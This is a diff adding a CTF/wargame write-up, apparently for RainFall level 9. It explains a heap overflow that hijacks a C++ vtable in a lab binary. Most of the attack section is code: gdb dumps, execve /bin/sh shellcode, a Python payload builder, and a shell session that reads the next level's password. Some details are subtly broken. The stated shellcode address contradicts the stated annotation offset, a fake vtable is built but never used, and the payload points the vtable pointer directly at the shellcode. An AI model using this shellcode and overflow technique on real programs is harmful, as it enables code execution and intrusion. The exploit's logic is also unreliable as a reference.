@@ -1,0 +1,103 @@
+# Level 9 - C++ vtable Hijacking
+
+## Vulnerability
+`memcpy` in `setAnnotation()` has no bounds checking - buffer overflow!
+
+## C++ Object Layout
+
+### Normal Object Structure
++------------------+
+| vtable pointer   | <- Points to vtable (4 bytes)
++------------------+
+| value (int)      | <- 4 bytes
++------------------+
+| annotation[100]  | <- 100 bytes buffer
++------------------+
+
+### Virtual Table (vtable)
+## Exploitation Strategy
+
+1. Overflow `obj1->annotation` buffer
+2. Overwrite `obj2`'s vtable pointer
+3. Point vtable to our shellcode
+4. When `operator+` is called, it executes our code
+
+## Analysis
+
+### Finding Object Addresses
+```bash
+(gdb) break main
+(gdb) run test
+(gdb) x/20wx obj1
+0x804a008:  0x08048848  0x00000005  ...
+
+(gdb) x/20wx obj2
+0x804a078:  0x08048848  0x00000006  ...
+```
+
+**Distance:** `0x804a078 - 0x804a008 = 112 bytes`
+
+### Memory Layout
+- obj1 starts at offset 0
+- vtable ptr at offset 0 (4 bytes)
+- value at offset 4 (4 bytes)  
+- annotation at offset 8 (100 bytes)
+- obj2 starts at offset 112
+
+To overflow from obj1.annotation to obj2.vtable:
+- Offset: 112 - 8 = 104 bytes
+
+## Exploitation
+
+### Shellcode
+```python
+# Shellcode to spawn shell
+shellcode = (
+    "\x31\xc0"              # xor eax, eax
+    "\x50"                  # push eax
+    "\x68\x2f\x2f\x73\x68"  # push "//sh"
+    "\x68\x2f\x62\x69\x6e"  # push "/bin"
+    "\x89\xe3"              # mov ebx, esp
+    "\x50"                  # push eax
+    "\x53"                  # push ebx
+    "\x89\xe1"              # mov ecx, esp
+    "\xb0\x0b"              # mov al, 11
+    "\xcd\x80"              # int 0x80
+)
+```
+
+### Building Payload
+```python
+#!/usr/bin/env python
+
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+# obj1 address + offset to annotation where shellcode will be
+shellcode_addr = "\x0c\xa0\x04\x08"  # 0x804a00c (obj1 + 4)
+
+# Fake vtable pointing to shellcode
+fake_vtable = shellcode_addr * 2  # Two function pointers
+
+# Build payload:
+# shellcode + padding to reach obj2 + fake_vtable pointer
+payload = shellcode
+payload += "A" * (104 - len(shellcode))  # Fill to obj2
+payload += shellcode_addr                 # Overwrite obj2's vtable ptr
+
+print payload
+```
+
+### Execution
+```bash
+level9@RainFall:~$ ./level9 $(python exploit.py)
+$ whoami
+bonus0
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
+
+## Key Concepts
+- C++ virtual tables (vtables)
+- Object-oriented exploitation
+- Function pointer hijacking
+- Heap-based buffer overflow
